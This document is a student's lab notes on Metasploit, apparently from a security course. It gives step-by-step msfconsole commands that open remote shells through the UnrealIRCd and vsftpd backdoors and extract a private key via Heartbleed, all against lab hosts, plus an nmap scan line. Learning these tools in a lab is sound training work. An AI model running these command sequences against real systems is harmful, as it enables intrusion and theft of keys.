# Metasploit

metasploit can be used to: 
- create trojan horses
- run attacks

Links
- https://docs.metasploit.com
- https://www.youtube.com/watch?v=oBAC5UfalC8
- https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
- https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/


### Example attack: Remote shell via IRC vulnerability 
From the Nessus scan i know that iloveshells.vm.vuln.land has a critical vulnerability that allows remote shell execution via IRC. To exploit this, i did the following. 
- `msfconsole` start it from console (now we can enter specific commands)
- `search irc` -> will show exploits (because the got "exploits" in their path/name) 
    - found unrealRDC 
- `use exploit/unix/irc/unreal_ircd_3281_backdoor` 
- `set RHOSTS iloveshells.vm.vuln.land` 
- `set payload payload/cmd/unix/bind_perl`
- `exploit`

 works :-)  we got our shell and can now run bash commands. Maybe it is because I don't know linux bash not very well (or metasploit, shell etc.) but I cannot really navigate in the folder. "cd .." doesn't seem to work to explore the file system. However, i can still do it via `ls / -al` to see the root dir and from there I coud use cat or pipes etc. to explore the system. 

(taken from exercise Gaining access 2 )

### Example attack on FTP vulnerability (see video)

- `msfconsole` start it from console (now we can enter specific commands)
- `search exploits` -> will show exploits (because the got "exploits" in their path/name) 
- `search vsftp`  -> search for exploit that has "vsftp" in its path/name
- `use exploit/unix/ftp/vsftpd_234_backdoor` use/run specific exploit (full path) > command promt will change (now can enter commands for that particular exploit)
    - `options` -> exists for every exploit
    - `set RHOSTS iloveshells.vm.vuln.land`  to set server to be attacked for the vsftpd exploit
        - you can run options again to see if it appears in options now
    - `show payloads` -> will show payloads that are available for this server (if there is only one it will automatically choose the only one available)$
    - `exploit` -> run/start acutal exploit (if there is only one exploit there we can leave out the payload)
        - with this exploit (vsftpd) a shell is now open (other exploits will provide different feedback) and we can now run commands on this shell which are executed on iloveshells.vm.vuln.land

(taken from video: https://www.youtube.com/watch?v=oBAC5UfalC8   )

### Exploit Heartbleed bug
1. start metasploit resource (exercise 2) and log in
2. Execute the commands
    - `msfconsole` > start metasploit
    - `use auxiliary/scanner/ssl/openssl_heartbleed` 
    - `set action KEYS`
    - `set RHOST heartbleed.vm.vuln.land` 
    - `set MAX_KEYTRIES 255` (as explained.. above 250 makes no sense)
    - `exploit`

Success: attack succeded. Private key starts with "MIICW"  (see screenshot)


### Further examples
- Postgres -> see solutions "Gaining Access/Metasploitable MV"
- Brute-force / Login SSH -> see solutions "Gaining Access/Metasploitable MV"
- Java RMI -> see solutions "Gaining Access/Metasploitable MV"


### Varia/Leftovers

- Heartbleed bug: There is another tool "Heartleech" to exploit the heartbleed vulnerabilitiy, which should be more reliable. However, I only succeded with metasploit
- check lab task "Gaining Access/Metasploitable MV"
- To find vulnerabilities we could use: 
    - Nessus (more advanced)
    - NMAP: `nmap -p -sV iloveshells.vm.vuln.land`(would show open ports + versions)